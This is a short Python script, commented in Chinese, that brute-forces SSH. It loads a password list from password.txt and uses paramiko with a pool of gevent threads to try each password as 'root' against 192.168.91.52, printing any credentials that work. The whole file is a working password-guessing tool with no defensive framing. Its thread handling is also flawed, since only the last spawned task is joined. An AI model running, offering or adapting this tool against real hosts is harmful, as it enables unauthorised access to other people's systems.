#encoding:utf-8

import paramiko
import gevent

from queue import LifoQueue
from gevent.pool import Pool
from gevent import monkey

ssh_que=LifoQueue()
monkey.patch_all()

def run(ip,username,password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=ip, port=22,
                    username=username, password=password,
                    banner_timeout=3,timeout=3)
        print("ip：%s, 用户名：%s, 密码：%s \n" % (ip, username,password))
    except paramiko.ssh_exception.AuthenticationException:
        pass
    finally:
        ssh.close()

if __name__ == '__main__':
    SshPool = Pool(5) #线程数
    with open('./password.txt','r') as file:
        for line in file.readlines():
            arg = (line.strip('\n'))
            ssh_que.put_nowait(arg)
    while not ssh_que.empty():
        Ssh_threads = [SshPool.spawn(run,'192.168.91.52','root',ssh_que.get_nowait())]
    gevent.joinall(Ssh_threads)
